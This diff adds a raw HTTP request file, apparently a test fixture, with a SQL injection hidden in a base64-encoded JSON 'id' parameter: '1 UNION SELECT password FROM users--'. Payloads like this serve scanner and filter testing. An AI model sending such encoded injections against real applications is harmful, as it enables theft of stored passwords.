@@ -1,0 +1,6 @@
+GET /user/id-b64-json?id=eyJ1aWQiOjEsIm1sIjoiMSIsImlkIjoiMSBVTklPTiBTRUxFQ1QgcGFzc3dvcmQgRlJPTSB1c2Vycy0tIn0%3D HTTP/1.1
+Host: app.example.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
+Accept: application/json
+Content-Length: 0
+
